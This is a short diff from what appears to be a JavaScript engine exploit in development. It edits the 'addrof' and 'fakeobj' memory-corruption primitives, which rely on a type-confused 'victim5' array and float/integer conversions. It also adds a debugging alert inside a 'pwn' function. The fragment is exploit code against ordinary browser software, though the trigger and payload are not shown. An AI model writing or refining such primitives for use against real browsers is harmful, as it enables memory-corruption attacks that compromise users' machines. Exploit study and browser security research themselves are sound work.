@@ -108,9 +108,9 @@ alert("here2");
 var primitives = {
  addrof: function (obj) {
   hax(backup);
-  victim5[0] = i2f(obj);
+  victim5[0] = obj;
   hax(i2jsv(0x0108211700001000));
-  return hex(f2i(victim5[2]));
+  return f2i(victim5[2]);
 },
 fakeobj: function (addr) {
   hax(i2jsv(0x0108211700001000));
@@ -125,6 +125,7 @@ function pwn() {
 
     var targetArray = [];
     var realjscell = primitives.addrof(targetArray[0]);
+    alert(primitives.addrof({}));
     alert(realjscell);
 
 }
